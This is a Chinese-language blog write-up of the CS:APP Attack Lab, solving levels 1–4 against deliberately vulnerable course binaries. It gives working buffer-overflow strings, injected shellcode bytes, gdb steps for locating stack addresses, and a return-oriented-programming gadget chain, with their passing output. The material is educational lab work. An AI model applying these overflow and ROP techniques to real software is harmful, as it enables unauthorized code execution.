---
url: attack-lab
title: 攻击实验
date: 2020-05-08 16:49:07
categories: [技术]
tags: [计算机系统实验]
---

CS:APP - Lab assignments #3 - Attack Lab: Understanding Buffer Overflow Bugs

<!--more-->

***若参考或转载请注明出处***

本实验通过代码注入攻击、[面向返回编程（Return-Oriented Programming，ROP）](https://zh.wikipedia.org/zh-cn/返回导向编程)攻击来帮助理解缓冲区溢出的危害。你将研究CS:APP3e的第3.10.3和3.10.4节，作为该实验的参考资料。

注意：

在本实验中，你将获得用于利用操作系统和网络服务器中的安全漏洞的方法的第一手经验。 我们的目的是帮助你了解程序的运行时操作，并了解这些安全漏洞的性质，以便在编写系统代码时可以避免它们。 我们不容忍使用任何其他形式的攻击来获得对任何系统资源的未经授权的访问。

完成此实验后：

- 你将学习攻击者利用安全漏洞的不同方法，当程序不能很好地保护自己免受缓冲区溢出的侵害时；
- 你将更好地了解如何编写更安全的程序，以及编译器和操作系统提供的一些功能，以使程序更不容易受到攻击；
- 你将对x86-64机器代码的堆栈和参数传递机制有更深入的了解；
- 你将对x86-64指令的编码方式有更深入的了解；
- 你将获得有关调试工具（例如`gdb`和`objdump`）的更多经验。

以下是有关此实验有效解决方案的一些重要规则的摘要。 当你第一次阅读本文档时，这些要点没有多大意义。 一旦开始，它们将在此处作为规则的主要参考。

- 你必须在与生成`target`的计算机相似的计算机上进行此实验。
- 你的解决方案可能不会使用攻击来规避程序中的验证代码。 具体来说，你将任何包含在`ret`指令中的攻击字符串中的地址都应指向以下目标之一：
  - 函数`touch1`、`touch2`或`touch3`的地址。
  - 你注入的代码的地址。
  - 来自`gadget farm`的一个`gadget`的地址。
- 你只能从文件`rtarget`构造`gadget`，其地址范围介于函数`start_farm`和`end_farm`之间。

本文所有操作均基于以下环境：

- OS: Ubuntu 18.04.4 LTS (Linux ubuntu 5.3.0-46-generic x86_64)
- Debugger: GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
- Compiler: gcc version 7.5.0

*有关实验的基本介绍参见实验说明（公众号后台回复“`attack lab`”即可下载）。*

# 准备

阅读`README.txt`，可以发现：

- `ctarget`：易受代码注入攻击的可执行程序（对应Part I即课程要求部分）；

- `rtarget`：易受ROP攻击的可执行程序（对应Part II）；

- `cookie.txt`：8位十六进制代码`cookie`，你将在攻击中将其用作唯一标识符；

- `farm.c`：目标的`gadget farm`的源代码，将用于ROP攻击；

- `hex2raw`：用于生成攻击字符串的实用程序。

*若完成课程要求部分，则只需用到 `ctarget`、`cookie.txt`和`hex2raw`。*

下图总结了实验的五个阶段。可以看出，前三个涉及对`catrget`的代码注入（CI）攻击（课程要求），而后两个涉及对`rtarget`的面向返回编程（ROP）攻击（课程未做要求）。

![Summary_of_attack_lab_phases](https://i0.hdslb.com/bfs/album/332b096ad366ae1448a30f6c436382b8844b54d2.png)

`ctarget`和`rtarget`都从标准输入读取字符串，二者都采用几个不同的命令行参数：

- `-h`：打印可能的命令行参数列表
- `-q`：不将结果发送到评分服务器（自学者**必须**在运行时加上此参数，否则会由于服务器不存在而报错）
- `-i <FILE>`：从文件而不是标准输入提供输入

与`Bomb Lab`不同，在此实验犯错误不会受到任何惩罚。 随意使用你喜欢的任何字符串向`ctarget`和`rtarget`开火。

# Part I: Code Injection Attacks

> 在前三个阶段中，你将**利用字符串攻击`ctarget`**。设置该程序的方式是，从一次运行到下一次运行，堆栈位置将保持一致，以便将堆栈上的数据视为可执行代码。这些功能使程序容易受到攻击，当你利用**包含可执行代码的字节编码**（机器码，即汇编文件中地址右侧的若干字节）**的字符串**时。

## Level 1

> 对于`level 1`，你将不会注入新代码。 相反，你将**利用字符串重定向程序**以执行现有过程。
>
> `ctarget`中的`test`函数调用了`getbuf`函数：
>
> ```c
> void test()
> {
>   int val;
>   val = getbuf();
>   printf("No exploit. Getbuf returned 0x%x\n", val);
> }
> ```
>
> ```c
> unsigned getbuf()
> {
>   char buf[BUFFER_SIZE];
>   Gets(buf);
>   return 1;
> }
> ```
>
> 当`getbuf`执行其`return`语句（`getbuf`的第5行）时，程序通常会返回到`test`（第5行）内恢复执行。 我们想改变这种行为。 在文件`ctarget`中，存在`touch1`函数：
>
> ```c
> void touch1()
> {
>   vlevel = 1; /* Part of validation protocol */
>   printf("Touch1!: You called touch1()\n");
>   validate(1);
>   exit(0);
> }
> ```
>
> 你的任务是**让`ctarget`在`getbuf`执行`return`语句时执行`touch1`的代码，而不是返回`test`**。 请注意，你的字符串可能还会破坏与该阶段不直接相关的堆栈部分，但这不会引起问题，因为`touch1`会导致程序直接退出。
>
> 一些忠告：
>
> - 你可以通过检查反汇编的`ctarget`来确定为此`level`设计字符串所需的所有信息。请使用`objdump -d`获取此反汇编的代码。
> - 思路是在字符串中放置`touch1`起始地址的字节表示，以便`getbuf`代码末尾的`ret`指令将控制权转移到`touch1`。
> - 注意字节顺序。
> - 你可能希望使用`gdb`在`getbuf`的最后几条指令中逐步执行该程序，以确保它在做正确的事情。
> - `buf`在`getbuf`的堆栈帧中的放置取决于编译时常量`BUFFER_SIZE`的值以及`gcc`使用的分配策略。 你将需要检查反汇编的代码以确定其位置。

目的就是用字符串将`getbuf`函数重定向执行`touch1`函数。

首先利用`objdump`工具反汇编，并将结果重定向存入`ctarget.s`文件以便分析。

```shell
objdump -d ctarget > ctarget.s
```

---

观察`test`函数：

```c
void test()
{
  int val;
  val = getbuf();
  printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

`getbuf`函数：

```c
unsigned getbuf()
{
  char buf[BUFFER_SIZE];
  Gets(buf);
  return 1;
}
```

发现`getbuf`函数第4行调用`Gets`读取输入的字符串并存入`buf`中，而`buf`只分配了`BUFFER_SIZE`大小的内存，所以存在缓冲区溢出漏洞。若要详细了解`getbuf`函数，则可以在`ctarget.s`中找到`getbuf`函数对应的汇编语句：

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  ...
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
  ...
```

4017a8分配了40字节大小的空间，可知`BUFFER_SIZE`的值为40。也就是说，**当输入字符串长度超过40就会发生缓冲区溢出，而且溢出的部分就会覆盖掉原来的返回地址**。

根据这个思路，我们可以首先输入40个字符，再输入8个字符作为溢出部分，而这8个字符就是要跳转到的`touch1`函数的地址。（**地址均为8字节**）

---

为获得`touch1`函数的地址，在`ctarget.s`中找到`touch1`函数对应的汇编语句：

```assembly
00000000004017c0 <touch1>:
  ...
```

可以看到`touch1`函数的地址为`0x4017c0`，这就是我们要输入的字符串末尾的字符。

---

<span id = "hex2rawq">[如何得到我们要输入的字符串？](#hex2raw)</span>

首先编辑用于攻击的字符串文件`exploit.txt`，同时注意**机器为小端法（little endian）时地址的字节序问题**（前40个字符任意输入）：

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 /* address of touch1 */
```

再将保存的`exploit.txt`输入到`ctarget`：

```shell
cat exploit.txt | ./hex2raw | ./ctarget -q
```

得到输出如下：

```shell
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

完成。

## Level 2

> `level 2`涉及**注入少量代码**作为字符串的一部分。
>
> `ctarget`中有`touch2`函数：
>
> ```c
> void touch2(unsigned val)
> {
>   vlevel = 2; /* Part of validation protocol */
>   if (val == cookie) {
>     printf("Touch2!: You called touch2(0x%.8x)\n", val);
>     validate(2);
>   } else {
>     printf("Misfire: You called touch2(0x%.8x)\n", val);
>     fail(2);
>   }
>   exit(0);
> }
> ```
>
> 你的任务是**让`ctarget`重定向至`touch2`并进入`validate`分支，而不是返回`test`**。
>
> 一些忠告：
>
> - 你将希望以某种方式在字符串中放置注入代码的地址的字节表示，以使`getbuf`代码末尾的`ret`指令将控制权转移给它。
> - 回想一下，函数的第一个参数在寄存器`％rdi`中传递。
> - 你注入的代码应将寄存器设置为`cookie`，然后使用`ret`指令进行转移控制到`touch2`中的第一条指令。
> - 请勿尝试在代码中使用`jmp`或调用指令。 这些指令的目标地址的编码很难确定。 对于所有控制转移，请使用`ret`指令，即使你不是从调用处返回也是如此。
> - 如何使用工具生成指令序列的字节级表示形式？

目的就是用字符串执行`touch2`函数，并使参数`val`等于`cookie`值。

和`level 1`类似，依然需要利用`getbuf`的缓冲区溢出漏洞，只不过在重定向至`touch2`之前需要将`cookie`值传入`％rdi`寄存器（函数的第一个参数）。

实现这个功能，造成了与`level 1`的不同之处——需要在编写的汇编代码中实现传入`cookie`值、返回到`touch2`这两个功能，而如何才能让程序执行我们编写的这段代码？因为可以将缓冲区溢出部分设置为任意地址来实现跳转，而且这段代码就存放于缓冲区中，所以可以将缓冲区溢出部分设置为**缓冲区（`%rsp`）的起始地址**，这样就可以跳转到我们编写的这段代码了。

---

明确思路后，寻找`touch2`地址：

```assembly
00000000004017ec <touch2>:
  ...
```

为`0x4017ec`。

---

编写汇编代码（**注意末尾的空行**）并保存为`touch2.s`文件：

```assembly
mov    $0x59b997fa,%rdi    # cookie
push   $0x4017ec           # touch2
ret

```

先传入`cookie`值，再将`touch2`地址压入栈中，执行`ret`时弹栈返回。由于栈的后进先出特点，返回地址即为后压入栈中的`0x4017ec`。

---

<span id ="generateq">[如何将汇编代码转换成字节码（机器码）？](#generate)</span>

将`touch2.s`文件进行汇编：

```shell
gcc -c touch2.s
```

反汇编：

```shell
objdump -d touch2.o
```

得到输出如下：

```shell

touch2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```

至此，得到了汇编语句对应的字节码：

```shell
48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */
68 ec 17 40 00          /* pushq  $0x4017ec */
c3                      /* retq */
```

---

接下来，寻找缓冲区`%rsp`的起始地址，利用`gdb`：

```shell
gdb ctarget
```

打断点：

```shell
(gdb) b getbuf
```

运行：

```shell
(gdb) r -q
```

单步跟踪：

```shell
(gdb) si
```

此时执行到`4017a8: sub $0x28,%rsp`处，打印`%rsp`的值（地址）：

```shell
(gdb) p/x $rsp
```

得到输出如下：

```shell
$1 = 0x5561dc78
```

即`%rsp`的值为`0x5561dc78`，此即缓冲区的起始地址。

---

和`level 1`类似，编辑用于攻击的字符串文件`exploit.txt`（**注意注释周围的空格**）：

```shell
48 c7 c7 fa 97 b9 59 /* mov    $0x59b997fa,%rdi */
68 ec 17 40 00 /* pushq  $0x4017ec */
c3 /* retq */
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* address of %rsp in getbuf */
```

再将保存的`exploit.txt`输入到`ctarget`：

```shell
cat exploit.txt | ./hex2raw | ./ctarget -q
```

得到输出如下：

```shell
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

完成。

## Level 3

> `level 3`还涉及**代码注入攻击**，但**传递字符串**作为参数。
>
> `ctarget`中有`hexmatch`函数和`touch3`函数：
>
> ```c
> /* Compare string to hex represention of unsigned value */
> int hexmatch(unsigned val, char *sval)
> {
>   char cbuf[110];
>   /* Make position of check string unpredictable */
>   char *s = cbuf + random() % 100;
>   sprintf(s, "%.8x", val);
>   return strncmp(sval, s, 9) == 0;
> }
>
> void touch3(char *sval)
> {
>   vlevel = 3; /* Part of validation protocol */
>   if (hexmatch(cookie, sval)) {
>     printf("Touch3!: You called touch3(\"%s\")\n", sval);
>     validate(3);
>   } else {
>     printf("Misfire: You called touch3(\"%s\")\n", sval);
>     fail(3);
>   }
>   exit(0);
> }
> ```
>
> 你的任务是**让`ctarget`重定向至`touch3`并进入`validate`分支，而不是返回`test`**。
>
> 一些忠告：
>
> - 你需要在字符串中包含`cookie`的字符串表示形式。 该字符串应包含8个十六进制数字（从最高位到最低位），并且前导“`0x`”。
> - 回想一下，一个字符串在C中表示为字节序列，后跟一个值为0的字节。在任何Linux机器上都可以使用“`man ascii`”查看所需字符的字节表示。
> - 你注入的代码应将寄存器`％rdi`设置为该字符串的**地址**。
> - 调用函数`hexmatch`和`strncmp`时，它们会将数据压入堆栈，覆盖保留`getbuf`使用的缓冲区的内存部分。 因此，你需要注意放置`cookie`的字符串表示形式的位置。

`level 3`和`level 2`差不多，只不过传参为字符串而不是数值（`cookie`已知）。

观察`touch3`函数：

```c
void touch3(char *sval)
{
  vlevel = 3; /* Part of validation protocol */
  if (hexmatch(cookie, sval)) {
    printf("Touch3!: You called touch3(\"%s\")\n", sval);
    validate(3);
  } else {
    printf("Misfire: You called touch3(\"%s\")\n", sval);
    fail(3);
  }
  exit(0);
}
```

发现应使表达式`hexmatch(cookie, sval)`的值为1。观察`hexmatch`函数：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
  char cbuf[110];
  /* Make position of check string unpredictable */
  char *s = cbuf + random() % 100;
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}
```

[什么是`strncmp`函数？](http://www.cplusplus.com/reference/cstring/strncmp/)

[什么是`sprintf`函数？](http://www.cplusplus.com/reference/cstdio/sprintf/)

结合返回值为1可知`strncmp(sval, s, 9) == 0`须成立，故参数`sval`字符串就应该是`cookie`值对应的字符串。结合ASCII表，可知`cookie`值`0x59b997fa`对应字符串的十六进制值为`35 39 62 39 39 37 66 61 00`（无前导“`0x`”）。

---

但是此处故意“Make position of check string unpredictable”——`char *s = cbuf + random() % 100;`，造成字符串`s`的位置变为随机而不可预知，再加上函数`touch3`、`hexmatch`和`strncmp`的一系列压栈导致`getbuf`缓冲区中的数据可能被重写。这样看来我们不能将`cookie`值对应的字符串放在`getbuf`缓冲区中。

---

由于`test`函数调用了`getbuf`函数，我们可以将输入的字符串存放到`test`的栈帧中。和`level 2`寻找缓冲区起始地址类似，我们寻找`test`缓冲区的起始地址（输入和输出一同显示）：

```shell
gdb ctarget
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ctarget...done.
(gdb) b test
Breakpoint 1 at 0x401968: file visible.c, line 90.
(gdb) r -q
Starting program: /media/psf/Home/Documents/Documents_Mac/Basis of Computer Systems/homework4_target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, test () at visible.c:90
90      visible.c: 没有那个文件或目录.
(gdb) si
92      in visible.c
(gdb) p/x $rsp
$1 = 0x5561dca8
```

得到缓冲区起始地址为`0x5561dca8`。

其实也可以由`getbuf`缓冲区起始地址`0x5561dc78`推算而来：`getbuf`函数分配了`0x28`字节大小的内存，`0x5561dc78+0x28=0x5561dca0`即为返回值的起始地址，也就是我们经常利用的40字节之外的缓冲区溢出部分的起始地址，此部分为8字节大小空间，`0x5561dca0+0x8=0x5561dca8`就是`test`缓冲区的起始地址。

这样我们又可以发现，在输入的字符串的40+8=48字节之外，再输入即可重写以地址`0x5561dca8`为起始的部分——就是我们要传入的字符串的地址。

---

`touch3`对应的汇编语句：

```assembly
00000000004018fa <touch3>:
  ...
```

得到`touch3`的地址为`0x4018fa`。

---

和`level 2`类似，编写汇编代码（**注意末尾的空行**）并保存为`touch3.s`文件（字符串传参为地址）：

```assembly
mov    $0x5561dca8,%rdi    # string
push   $0x4018fa           # touch3
ret

```

汇编并反汇编：

```shell
gcc -c touch3.s
objdump -d touch3.o
```

得到输出如下：

```shell

touch3.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq
```

至此，得到了汇编语句对应的字节码：

```shell
48 c7 c7 a8 dc 61 55    /* mov    $0x5561dca8,%rdi */
68 fa 18 40 00          /* pushq  $0x4018fa */
c3                      /* retq */
```

---

和`level 2`类似，编辑用于攻击的字符串文件`exploit.txt`（**注意注释周围的空格**）：

```shell
48 c7 c7 a8 dc 61 55 /* mov    $0x5561dca8,%rdi */
68 fa 18 40 00 /* pushq  $0x4018fa */
c3 /* retq */
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* address of %rsp in getbuf */
35 39 62 39 39 37 66 61 00 /* address of string */
```

再将保存的`exploit.txt`输入到`ctarget`：

```shell
cat exploit.txt | ./hex2raw | ./ctarget -q
```

得到输出如下：

```shell
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

完成。

## <span id = "hex2raw">Using `hex2raw`</span>

`hex2raw`将十六进制格式的字符串作为输入。在这种格式下，每个字节值由两个十六进制数字表示。 例如，字符串“`012345`”可以十六进制格式输入为“`30 31 32 33 34 35 00`”。（请记住，十进制数字`X`的ASCII码为`0x3X`，并且字符串的结尾由空字节指示。）

传递给`hex2raw`的十六进制字符应由空格（空格或换行符）分隔。我们建议你在处理字符串的不同部分使用换行符分隔。 `hex2raw`支持C样式的块注释，因此你可以标记字符串的各个部分（**确保在开始和结束注释字符串（“`/*` ”，“`*/`”）周围都留有空格，以便注释被忽略**）。

如果在文件`exploit.txt`中生成了十六进制格式的字符串，则可以通过几种不同方式将原始字符串应用于`ctarget`或`rtarget`：

1. 你可以设置一系列管道以将字符串通过`hex2raw`传递。

   ```shell
   unix> cat exploit.txt | ./hex2raw | ./ctarget
   ```

2. 你可以将原始字符串存储在文件中并使用I/O重定向：

   ```shell
   unix> ./hex2raw < exploit.txt > exploit-raw.txt
   unix> ./ctarget < exploit-raw.txt
   ```

   从`gdb`内部运行时，也可以使用这种方法：

   ```shell
   unix> gdb ctarget
   (gdb) run < exploit-raw.txt
   ```

3. 你可以将原始字符串存储在文件中，并提供文件名作为命令行参数：

   ```shell
   unix> ./hex2raw < exploit.txt > exploit-raw.txt
   unix> ./ctarget -i exploit-raw.txt
   ```

   从`gdb`内部运行时，也可以使用这种方法。

[点此返回](#hex2rawq)

## <span id = "generate">Generating Byte Codes</span>

将`gcc`用作汇编器，将`objdump`用作反汇编器，可以方便地生成指令序列的字节码。例如，假设你编写的文件`example.s`包含以下汇编代码：

```assembly
# Example of hand-generated assembly code
  pushq   $0xabcdef    # Push value onto stack
  addq    $17,%rax     # Add 17 to %rax
  movl    %eax,%edx    # Copy lower 32 bits to %edx
```

此代码可以包含指令和数据的混合。“`＃`”字符右侧的任何内容均为注释。

你现在可以汇编和反汇编此文件：

```shell
unix> gcc -c example.s
unix> objdump -d example.o > example.d
```

生成的文件`example.d`包含以下内容：

```assembly
example.o: file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
  0: 68 ef cd ab 00    pushq  $0xabcdef
  5: 48 83 c0 11       add    $0x11,%rax
  9: 89 c2             mov    %eax,%edx
```

底部几行显示了根据汇编语言指令生成的机器代码。 每行的左侧都有一个十六进制数字，表示该指令的起始地址（从0开始），而“`:`”字符后的十六进制数字表示该指令的**字节码**。 因此，我们可以看到指令`push $0xABCDEF`具有十六进制格式的字节码`68 ef cd ab 00`。

从此文件中，你可以获得代码的字节序列：

```shell
68 ef cd ab 00 48 83 c0 11 89 c2
```

然后，可以将该字符串通过`hex2raw`传递，以生成目标程序的输入字符串。或者，你可以编辑`example.d`以忽略无关的值，并包含C样式的注释以提高可读性，从而得到：

```shell
68 ef cd ab 00   /* pushq  $0xabcdef  */
48 83 c0 11      /* add    $0x11,%rax */
89 c2            /* mov    %eax,%edx  */
```

这也是在发送给目标程序之一之前可以通过`hex2raw`传递的有效输入。

[点此返回](#generateq)

---

若只完成课程要求部分，则此时可以结束阅读。

下面是课程要求外的部分。

---

# Part II: Return-Oriented Programming

> 对`rtarget`进行代码注入攻击比对`ctarget`进行难度要大得多，因为它使用两种技术来阻止此类攻击：
>
> - 它使用**随机化**，以使堆栈位置在一个行程与另一个行程之间有所不同。 这使得无法确定注入的代码将位于何处。
> - 它会将保存堆栈的内存部分标记为**不可执行**，因此，即使你可以将程序计数器设置为注入代码的开始，程序也会因**段错误（segmentation fault）**而失败。
>
> 幸运的是，聪明的人已经设计了策略，可以通过**执行现有代码而不是注入新代码**来在程序中完成有用的事情。 这种方法的最一般形式称为**面向返回编程（ROP）**。 ROP的策略是**在现有程序中标识由一个或多个指令以及指令`ret`组成的字节序列**。 这样的段称为**`gadget`**。
>
> ![设置要执行的gadget序列](https://i0.hdslb.com/bfs/album/64bcd82986df489007563ffedaed3431144d5b11.png)
>
> 上图说明了如何设置堆栈以执行n个`gadget`序列。在此图中，堆栈包含一系列`gadget`地址。每个`gadget`均由一系列指令字节组成，最后一个为`0xc3`，用于编码`ret`指令。当程序从该配置开始执行`ret`指令时，它将启动一系列`gadget`执行，其中`ret`指令位于每个`gadget`的末尾，从而导致程序跳至下一个小程序的开头。
>
> `gadget`可以使用与编译器生成的汇编语句相对应的代码，尤其是在函数末尾的代码。在实践中，可能有一些有用的`gadget`，但不足以实现许多重要的操作。例如，编译后的函数极不可能在弹出之前将`popq ％rdi`作为其最后一条指令。幸运的是，对于面向字节的指令集（例如x86-64），通常可以通过从指令字节序列的其他部分提取模式来找到`gadget`。
>
> 例如，一个版本的`rtarget`包含为以下C函数生成的代码：
>
> ```c
> void setval_210(unsigned *p)
> {
>   *p = 3347663060U;
> }
> ```
>
> 此功能对攻击系统有用的机会似乎很小。 但是，此功能的反汇编机器码显示了一个有趣的字节序列：
>
> ```assembly
>
> 0000000000400f15 <setval_210>:
>   400f15: c7 07 d4 48 89 c7    movl $0xc78948d4,(%rdi)
>   400f1b: c3    retq
> ```
>
> 字节序列`48 89 c7`对指令`movq ％rax，％rdi`进行编码。 （有关有用的movq指令的编码，请参见下图。）
>
> ![movq指令的编码](https://i0.hdslb.com/bfs/album/45f40f64ddcbeaba1ea62bdf8da2a1a77e3fb852.png)
>
> 此序列后跟字节值`c3`，该字节值对`ret`指令进行编码。 该函数从地址`0x400f15`开始，序列从该函数的第四个字节开始。 因此，该代码包含一个起始地址为`0x400f18`的`gadget`，该`gadget`会将寄存器`％rax`中的64位值复制到寄存器`％rdi`。
>
> `rtarget`的代码在我们称为`gadget farm`的区域中包含许多与上面显示的`setval_210`函数相似的函数。 你的工作将是识别`gadget farm`中的有用`gadget`，并使用它们执行与`level 2`和`level 3`中类似的攻击。
>
> 重要提示：`gadget farm`在`rtarget`副本中由函数`start_farm`和`end_farm`划分。 请勿尝试从程序代码的其他部分构造`gadget`。

`level 4`和`level 5`分别对应着`level 2`和`level 3`，区别是此时将对`rtarget`进行攻击，而不再是`ctarget`。`rtarget`开启了地址随机化和栈不可执行机制，我们将不能注入新的代码，但是我们可以将现有的代码转化为新的代码，即**ROP**方法。

反汇编：

```shell
objdump -d rtarget > rtarget.s
```

## Level 4

> 对于`level 4`，你将重复`level 2`的攻击，但是使用`gadget farm`中的`gadget`在`rtarget`上进行此操作。 你可以使用由以下指令类型组成的`gadget`并仅使用前八个x86-64寄存器（`％rax`–`％rdi`）来构建解决方案。
> `movq`：这些代码在下图A中显示。
> `popq`：这些代码在下图B中显示。
>
> ![图3A-B](https://i0.hdslb.com/bfs/album/d87683f936aad3c68d2369f81fa6a69f6f5f356c.png)
>
> `ret`：该指令由单字节`0xc3`编码。
> `nop`：该指令（发音为“ no op”，缩写为“ no operation”）由单字节`0x90`编码。 唯一的作用是使程序计数器加1。
>
> 一些忠告：
>
> - 你所需的所有`gadget`都可以在函数`start_farm`和`mid_farm`划定的`rtarget`的代码区域中找到。
> - 你可以仅用两个`gadget`进行这种攻击。
> - 当`gadget`使用`popq`指令时，它将从堆栈中弹出数据。 结果，你的漏洞利用字符串将包含`gadget`地址和数据的组合。

目的与`level 2`相同，即用字符串执行`touch2`函数，并使参数`val`等于`cookie`值。

由于不能注入我们自己编写的代码，我们需要从`rtarget.s`中的`<start_farm>`（401994）和`<end_farm>`（401ab2）之间寻求已有的代码作为替代。类似地，利用`getbuf`的缓冲区溢出漏洞，将找到替代的代码**地址**直接置于40字节之后。

回忆我们在`level 2`中编写的代码：

```assembly
mov    $0x59b997fa,%rdi    # cookie
push   $0x4017ec           # touch2
ret
```

思路是先将`cookie`值传入`%rdi`，再跳转到`touch2`地址即可。

---

现在不可以直接将一个特定立即数传给某寄存器，所以先将此立即数保存在栈中，再`pop`到指定寄存器。

![图3B](https://i0.hdslb.com/bfs/album/d1b0deab1dac82261afbe3d0d070b866ba6fcaa7.png)

观察上图，并寻找含有`58`～`5f`的语句：

```assembly
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq
```

此处的`58 90 c3`对应：

```assembly
popq    %rax
nop
ret
```

我们找到了可以`pop`到`%rax`寄存器的指令，地址为`4019a7+4=4019ab`。

---

然后我们寻找可以实现`%rax`->...->`%rdi`的指令。

![图3A](https://i0.hdslb.com/bfs/album/8423a14b10acd90c54410f40765cb128cd5e16aa.png)

观察上图，如果有`48 89 c7`最好，如果没有则需要多传递几次。寻找结果：

```assembly
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq
```

此处的`48 89 c7 c3`对应：

```assembly
movq    %rax,%rdi
ret
```

地址为`4019a0+2=4019a2`。

---

将得到的各个`gadget`进行总结：

```assembly
popq    %rax      # 4019ab
                  # cookie
movq    %rax,%rdi # 4019a2
                  # address of touch2
```

其中`cookie`为`59b997fa`，`touch2`的地址为`4017ec`。

---

编辑用于攻击的字符串文件`exploit.txt`（**注意注释周围的空格**）：

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 /* popq    %rax */
fa 97 b9 59 00 00 00 00 /* cookie */
a2 19 40 00 00 00 00 00 /* movq    %rax,%rdi */
ec 17 40 00 00 00 00 00 /* address of touch2 */
```

再将保存的`exploit.txt`输入到`rtarget`：

```shell
cat exploit.txt | ./hex2raw | ./rtarget -q
```

得到输出如下：

```shell
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

完成。

## Level 5

>在进行`level 5`之前，请暂停思考你到目前为止已完成的工作。在`level 2`和`level 3`中，你使程序执行自己设计的机器代码。如果`ctarget`曾经是网络服务器，则可以将自己的代码注入到远程计算机中。在`level 4`中，你规避了现代系统用来阻止缓冲区溢出攻击的两个主要设备。尽管你没有注入自己的代码，但是你仍然可以注入一种程序，该程序通过将现有代码序列拼接在一起来运行。你还为此实验获得了95/100分。这是一个很好的成绩。如果你还有其他紧迫的任务，请考虑立即停止。
>
>`level 5`要求你对`rtarget`进行ROP攻击，以使用指向`cookie`字符串表示形式的指针来调用函数`touch3`。除了使用ROP攻击来调用`touch2`之外，这似乎似乎没有那么困难。此外，第5阶段仅计5分，这并不是衡量其所需努力的真实指标。对于那些想要超越课程正常期望的人，将其视为额外的学分问题。
>
>要解决`level 5`，可以在函数`rstart_farm`和`end_farm`划分的`rtarget`中的代码区域中使用`gadget`。 除了在`levle 4`中使用的`gadget`之外，此扩展服务器场还包括不同`movl`指令的编码，如下图C所示。 服务器场此部分中的字节序列还包含2字节指令，这些指令用作功能上的`nop`，即它们不更改任何寄存器或内存值。这些指令包括下图D中所示的指令，例如`andb ％al，％al`，它们在某些寄存器的低位字节上运行，但不更改其值。
>
>![图3C-D](https://i0.hdslb.com/bfs/album/04d8bf7d3bcc66bb6036a90d9357d9ee4882ab56.png)
>
>一些忠告：
>
